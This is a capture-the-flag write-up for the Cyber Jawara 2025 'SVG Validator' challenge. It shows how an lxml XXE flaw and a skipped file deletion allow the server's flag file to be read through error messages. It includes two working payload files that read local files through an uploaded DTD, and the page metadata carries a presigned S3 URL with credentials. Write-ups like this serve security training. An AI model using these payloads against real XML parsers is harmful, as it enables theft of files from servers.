---
id: 17948583-e65d-8037-bf0f-d573b2499823
title: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
created_time: 2025-01-12T10:59:00.000Z
last_edited_time: 2025-05-22T09:16:00.000Z
cover_image: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif
icon_emoji: 🫡
categories:
  - XXE
verification:
  state: unverified
  verified_by: null
  date: null
page: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif

---

# Description

A simple SVG validator.

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/8d6a70b2-6c3c-410a-9ddb-5303e731a08d/svg-validator.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB4662X4OUTZP%2F20250522%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250522T210321Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECUaCXVzLXdlc3QtMiJGMEQCIBqfVF0mCQpTv89yyjhPkaBZ1Df2mJxzQM75EAM1kbV6AiBuYJwjM5rJGY2ChxUtZn1bZHt3%2BNN5vj1mU%2FeUvFK39iqIBAje%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMiFgnnwkNM1YGXIYEKtwDM5n%2BWtEhtEowlpIQusSc3BHoJLpbo7byzCzRGZSsmeyxHNLwQimZd4T%2F1%2B17cLArtYMDANHinelUQaVTCp2pLmYlpAGYz2oInN0m2zfxLetqSsAACj8okjiwiskEmis4StQ%2BfKbTyqDNh9yU13yUFPzVVrM%2B%2FRHNUQqjeAQStFqpRfgLyGKju%2BnNGgDL8uQVmkuYywaYdbZoT9bn%2BSvG0Y2CseFdDUbY2q2%2B6U0gnkzLTYWaBbmENB0zEUJzKNHwC%2BuwzYTSIIBCDAahU7ARyIR9ZuCQdxScfecKpMPeiWnuWKDgh%2Ff4eUjAfz9qqGCu6r54HrJiUwHLY930vGMHaYTdT1Qw%2F9itM3NlRtXGPwXmpGqCCGpz4R%2B%2FK1q7k4TyhM%2Fkf2KwYWqqIOMGF39phNeNn7mPbYI2b7qrWKwrecHj%2FnV5MRyG8y%2B7ZMWJWMpoeKl8SYhz62Q0xmxU%2BD9si2uyVks%2Bs1vpZahkSYI6%2FYDqgD9No6V3A6NdPzhyVr0truT5Z8kov0I%2B7W%2BgjwsLvl5rPfkuhM%2BQfRXlVFAFmdxxyC3Z%2FWAjdT%2BhL%2FcCWHS5gzhTMo74zQc7bNaE8TUUIP3414mYL9Mp1EIUQ65KLVBk3dsng6MWtGyLqR8wtZO%2BwQY6pgHaOOQNyfVp12HvePQ527gf6LzFeKO9DLS3zXT79jzB%2BRmaoHTOMlUhRSGr9RhUqXQM%2FJtSqGLp0dHtsZ4v%2BETyb7YiTP%2FsgpeY%2FEoagQ31zeR8b3HCqB3iywj0rHqJhvJc7EfWl9Z2ig%2FCQAyOcGbZgip31dNbaVPy74EuIcd4M0wK%2FgfyPTC9gyO28wLkF%2BznFgCU%2F%2B0tvJbqbTtfdpq3LOK3H8lV\&X-Amz-Signature=5b2e7c0331cc18e5c9ab7508a85a1342c1dec11a22ccd12e4ecf2773cb85ba61\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# Exploit

In order to gain Arbitrary File Read, we will exploit the XXE vulnerability in the `lxml.etree`. We must introduce an error in the XML since we cannot read the flag information directly because we do not receive the rendered XML's direct output.

For this task, we have to save our local file on the server, but we can't because it will be deleted after validation. However, we can store and get around the `os.remove` due of a logical error:

```python
        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

Therefore, by making the `is_valid_svg` function throw an error, we can avoid the `os.remove` step and ensure that the file stored on the server will remain intact even if our `is_valid_svg` method gives an error.

```python
def is_valid_svg(file_path):
    tree = etree.parse(file_path)
    root = tree.getroot()
    return root.tag.endswith('svg')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    if not allowed_file(file.filename):
        return jsonify({'error': 'Invalid file extension'}), 400

    file_path = ''

    try:
        extension = file.filename.rsplit('.', 1)[1].lower()

        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)

        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

We now need to keep one XML file on the server so that we can add it later to cause an error that will leak the flag. This is the first file we upload:

testing.svg

```python
<!ENTITY % content SYSTEM "file://app/flag.txt">
	<!ENTITY % test '<!ENTITY &#x25; file SYSTEM "file:///tmp/%content;">'>
 	%test;
```

due to the etree.Parse will automatically avoid the os.remove function and throw an error since it does not recognize this as valid XML. The second file is as follows:

file.svg

```python
<!DOCTYPE root [
	<!ENTITY % dtd SYSTEM "file:///tmp/051880fbfbd0b3f38ec3244610784c3a9c258f755039bb7cf1311fd1fc843f2d.svg">
 	%dtd;
]>
<svg></svg>
```

The file in tmp is a file that we upload before, the hash isn’t random and same each iteration because their filename isn’t use secret.token\_hex function properly:

```python
        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
```

So after we uploaded that two file we will get the flag:

![](./imgs/image_UQYv5eO4.png)
